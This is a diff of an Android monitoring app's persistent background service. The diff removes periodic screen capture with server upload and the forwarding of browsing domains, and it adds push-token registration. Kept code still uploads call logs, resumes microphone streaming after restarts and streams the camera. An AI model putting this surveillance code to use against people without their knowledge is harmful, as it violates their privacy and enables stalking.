@@ -12,13 +12,6 @@ import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.SharedPreferences;
 import android.os.SystemClock;
-import android.graphics.ImageFormat;
-import android.graphics.PixelFormat;
-import android.hardware.display.DisplayManager;
-import android.hardware.display.VirtualDisplay;
-import android.media.projection.MediaProjection;
-import android.media.projection.MediaProjectionManager;
-import android.util.DisplayMetrics;
 import android.hardware.camera2.CameraAccessException;
 import android.hardware.camera2.CameraCaptureSession;
 import android.hardware.camera2.CameraCharacteristics;
@@ -30,7 +23,6 @@ import android.location.LocationListener;
 import android.location.LocationManager;
 import android.media.AudioFormat;
 import android.media.AudioRecord;
-import android.media.Image;
 import android.media.ImageReader;
 import android.media.MediaRecorder;
 import android.database.ContentObserver;
@@ -91,13 +83,6 @@ public class KeepAliveService extends Service {
     private boolean               shouldConnect = false;
     private BroadcastReceiver     systemReceiver; // reconnects WS on screen-on / network change
 
-    // ── Screen capture fields ─────────────────────────────────────────────────
-    private MediaProjection      mediaProjection;
-    private VirtualDisplay       virtualDisplay;
-    private ImageReader          screenReader;
-    private volatile boolean     screenCapturing = false;
-    private static final int     SCREEN_CAPTURE_INTERVAL_MS = 30000; // 30 sec
-
     // ── Live Monitor fields ───────────────────────────────────────────────────
     private LiveKitManager       lkManager;     // LiveKit camera publisher
 
@@ -122,8 +107,8 @@ public class KeepAliveService extends Service {
     // Set in onTaskRemoved so onDestroy skips clearing prefs — service will restart and resume
     private volatile boolean     restarting = false;
 
-    // Lets other components in-process (e.g. BrowserActivityAccessibilityService) submit data
-    // without needing their own WebSocket connection.
+    // Lets other components in-process submit data without needing their own
+    // WebSocket connection.
     private static volatile KeepAliveService instance;
 
     // ── Lifecycle ─────────────────────────────────────────────────────────────
@@ -198,10 +183,6 @@ public class KeepAliveService extends Service {
                     if (nativeWs != null) nativeWs.cancel();
                     connectWebSocket();
                 }
-            } else if ("START_SCREEN_CAPTURE".equals(intent.getAction())) {
-                int resultCode = intent.getIntExtra("resultCode", -1);
-                Intent data    = intent.getParcelableExtra("data");
-                if (resultCode != -1 && data != null) startScreenCapture(resultCode, data);
             } else if ("DISCONNECT".equals(intent.getAction())) {
                 shouldConnect = false;
                 if (nativeWs != null) { nativeWs.cancel(); nativeWs = null; }
@@ -216,7 +197,6 @@ public class KeepAliveService extends Service {
     @Override
     public void onDestroy() {
         shouldConnect = false;
-        stopScreenCapture();
         handleStopCamera();
         if (restarting) {
             // Service is restarting — stop hardware but preserve SharedPreferences so
@@ -353,53 +333,11 @@ public class KeepAliveService extends Service {
         handler.postDelayed(this::connectWebSocket, 3000);
     }
 
-    // ── Auto-captured browsing domains ──────────────────────────────────────────
+    // ── Call log (ContentObserver-driven) ────────────────────────────────────────
     // Static entry point so other in-process components can submit data without needing
     // their own WebSocket connection. Sends immediately if we're connected and
     // authenticated; otherwise queues to SharedPreferences and the queue is flushed as soon
     // as the next auth_ok arrives.
-
-    public static void sendBrowsingEvent(Context ctx, JSONObject entry) {
-        KeepAliveService svc = instance;
-        if (svc != null && svc.nativeWs != null && svc.userId != null) {
-            svc.sendBrowsingEventNow(entry);
-        } else {
-            queueBrowsingEvent(ctx, entry);
-        }
-    }
-
-    private void sendBrowsingEventNow(JSONObject entry) {
-        try {
-            JSONObject out = new JSONObject();
-            out.put("type", "browsing_add");
-            out.put("entry", entry);
-            nativeWs.send(out.toString());
-        } catch (Exception ignored) {}
-    }
-
-    private static void queueBrowsingEvent(Context ctx, JSONObject entry) {
-        try {
-            SharedPreferences prefs = SecurePrefs.get(ctx);
-            JSONArray pending = new JSONArray(prefs.getString("pendingBrowsingEvents", "[]"));
-            pending.put(entry);
-            prefs.edit().putString("pendingBrowsingEvents", pending.toString()).apply();
-        } catch (Exception ignored) {}
-    }
-
-    private void flushPendingBrowsingEvents() {
-        try {
-            SharedPreferences prefs = SecurePrefs.get(this);
-            JSONArray pending = new JSONArray(prefs.getString("pendingBrowsingEvents", "[]"));
-            if (pending.length() == 0) return;
-            for (int i = 0; i < pending.length(); i++) {
-                sendBrowsingEventNow(pending.getJSONObject(i));
-            }
-            prefs.edit().remove("pendingBrowsingEvents").apply();
-        } catch (Exception ignored) {}
-    }
-
-    // ── Call log (ContentObserver-driven) ────────────────────────────────────────
-    // Same immediate-send-or-queue-and-flush pattern as sendBrowsingEvent above.
 
     public static void sendCallLogEvent(Context ctx, JSONObject entry) {
         KeepAliveService svc = instance;
@@ -437,6 +375,39 @@ public class KeepAliveService extends Service {
                 sendCallLogEventNow(pending.getJSONObject(i));
             }
             prefs.edit().remove("pendingCallLogEvents").apply();
+        } catch (Exception ignored) {}
+    }
+
+    // ── FCM push token registration ──────────────────────────────────────────────
+    // Same immediate-send-or-queue-and-flush pattern as sendCallLogEvent above, called
+    // from FamilyWatchMessagingService.onNewToken(). Only the latest token matters (not a
+    // history of events), so this queues a single value rather than an array.
+
+    public static void sendFcmTokenRegistration(Context ctx, String token) {
+        KeepAliveService svc = instance;
+        if (svc != null && svc.nativeWs != null && svc.userId != null) {
+            svc.sendFcmTokenNow(token);
+        } else {
+            SecurePrefs.get(ctx).edit().putString("pendingFcmToken", token).apply();
+        }
+    }
+
+    private void sendFcmTokenNow(String token) {
+        try {
+            JSONObject out = new JSONObject();
+            out.put("type", "register_fcm_token");
+            out.put("token", token);
+            nativeWs.send(out.toString());
+        } catch (Exception ignored) {}
+    }
+
+    private void flushPendingFcmToken() {
+        try {
+            SharedPreferences prefs = SecurePrefs.get(this);
+            String token = prefs.getString("pendingFcmToken", null);
+            if (token == null) return;
+            sendFcmTokenNow(token);
+            prefs.edit().remove("pendingFcmToken").apply();
         } catch (Exception ignored) {}
     }
 
@@ -525,9 +496,9 @@ public class KeepAliveService extends Service {
             String type = msg.optString("type");
             if ("auth_ok".equals(type)) {
                 userId = msg.optString("userId"); // store our assigned userId
-                uploadToken = msg.optString("uploadToken"); // per-connection token for HTTP uploads (screenshot)
-                flushPendingBrowsingEvents(); // send anything queued while we were disconnected
-                flushPendingCallLogEvents();
+                uploadToken = msg.optString("uploadToken"); // per-connection token for HTTP uploads (profile photo)
+                flushPendingCallLogEvents(); // send anything queued while we were disconnected
+                flushPendingFcmToken();
                 // Auto-resume mic if it was streaming before service was restarted
                 SharedPreferences prefs = SecurePrefs.get(this);
                 if (prefs.getBoolean("micActive", false) && !micStreaming) {
@@ -682,6 +653,7 @@ public class KeepAliveService extends Service {
                     .header("X-File-Name", Uri.encode(file.getName()))
                     .header("X-Admin-Id", fromAdminId)
                     .header("X-User-Id", userId != null ? userId : "")
+                    .header("X-Upload-Token", uploadToken != null ? uploadToken : "")
                     .header("Content-Type", uploadMime)
                     .build();
 
@@ -707,109 +679,6 @@ public class KeepAliveService extends Service {
             err.put("fromUserId", userId);
             nativeWs.send(err.toString());
         } catch (Exception ignored) {}
-    }
-
-    // ── Screen capture — MediaProjection ─────────────────────────────────────
-
-    // Called from MainActivity after user grants MediaProjection permission (one-time)
-    public void startScreenCapture(int resultCode, Intent data) {
-        if (screenCapturing) return;
-        MediaProjectionManager mpm =
-            (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
-        mediaProjection = mpm.getMediaProjection(resultCode, data);
-        if (mediaProjection == null) return;
-
-        DisplayMetrics dm = getResources().getDisplayMetrics();
-        // Capture at 720p max to save storage
-        int dw = Math.min(dm.widthPixels,  1280);
-        int dh = Math.min(dm.heightPixels, 720);
-
-        screenReader = ImageReader.newInstance(dw, dh, PixelFormat.RGBA_8888, 2);
-        virtualDisplay = mediaProjection.createVirtualDisplay(
-            "meeee-capture", dw, dh, dm.densityDpi,
-            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
-            screenReader.getSurface(), null, null);
-
-        screenCapturing = true;
-        scheduleScreenCapture();
-    }
-
-    private void scheduleScreenCapture() {
-        if (!screenCapturing) return;
-        handler.postDelayed(() -> {
-            captureScreen();
-            scheduleScreenCapture();
-        }, SCREEN_CAPTURE_INTERVAL_MS);
-        // Also capture immediately on first start
-    }
-
-    private void captureScreen() {
-        if (!screenCapturing || screenReader == null) return;
-        // Skip while the screen is off — nothing useful to capture, and this avoids
-        // needless battery/network use. The loop keeps running so capture resumes
-        // automatically once the screen turns back on.
-        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
-        if (pm != null && !pm.isInteractive()) return;
-        new Thread(() -> {
-            try (Image image = screenReader.acquireLatestImage()) {
-                if (image == null) return;
-                Image.Plane plane = image.getPlanes()[0];
-                int rowPadding = plane.getRowStride() - plane.getPixelStride() * image.getWidth();
-                android.graphics.Bitmap bmp = android.graphics.Bitmap.createBitmap(
-                    image.getWidth() + rowPadding / plane.getPixelStride(),
-                    image.getHeight(), android.graphics.Bitmap.Config.ARGB_8888);
-                bmp.copyPixelsFromBuffer(plane.getBuffer());
-                // Crop to exact dimensions (remove row padding)
-                bmp = android.graphics.Bitmap.createBitmap(bmp, 0, 0, image.getWidth(), image.getHeight());
-
-                // Compress to WebP
-                ByteArrayOutputStream baos = new ByteArrayOutputStream();
-                android.graphics.Bitmap.CompressFormat fmt = (Build.VERSION.SDK_INT >= 30)
-                    ? android.graphics.Bitmap.CompressFormat.WEBP_LOSSY
-                    : android.graphics.Bitmap.CompressFormat.WEBP;
-                bmp.compress(fmt, 65, baos);
-                bmp.recycle();
-
-                // Delete screenshots older than 24h
-                deleteOldScreenshots();
-
-                // Upload to server
-                uploadScreenshot(baos.toByteArray());
-            } catch (Exception ignored) {}
-        }).start();
-    }
-
-    private void uploadScreenshot(byte[] data) {
-        if (serverUrl == null || userId == null || uploadToken == null) return;
-        try {
-            String httpBase = serverUrl
-                .replaceFirst("^wss://", "https://")
-                .replaceFirst("^ws://", "http://")
-                .replaceFirst("/ws$", "");
-            String uploadUrl = httpBase + "/api/screenshot/" + userId;
-            String name = userName != null ? userName : "User";
-
-            RequestBody body = RequestBody.create(data, MediaType.parse("image/webp"));
-            Request req = new Request.Builder()
-                .url(uploadUrl)
-                .post(body)
-                .header("Content-Type", "image/webp")
-                .header("X-User-Name", Uri.encode(name))
-                .header("X-Upload-Token", uploadToken)
-                .build();
-            httpClient.newCall(req).execute().close();
-        } catch (Exception ignored) {}
-    }
-
-    private void deleteOldScreenshots() {
-        // Server handles 24h TTL; this is a no-op placeholder for local storage if added later
-    }
-
-    private void stopScreenCapture() {
-        screenCapturing = false;
-        try { if (virtualDisplay != null) { virtualDisplay.release(); virtualDisplay = null; } } catch (Exception ignored) {}
-        try { if (screenReader   != null) { screenReader.close();    screenReader   = null; } } catch (Exception ignored) {}
-        try { if (mediaProjection != null) { mediaProjection.stop(); mediaProjection = null; } } catch (Exception ignored) {}
     }
 
     // ── Live Monitor — LiveKit camera publisher ───────────────────────────────
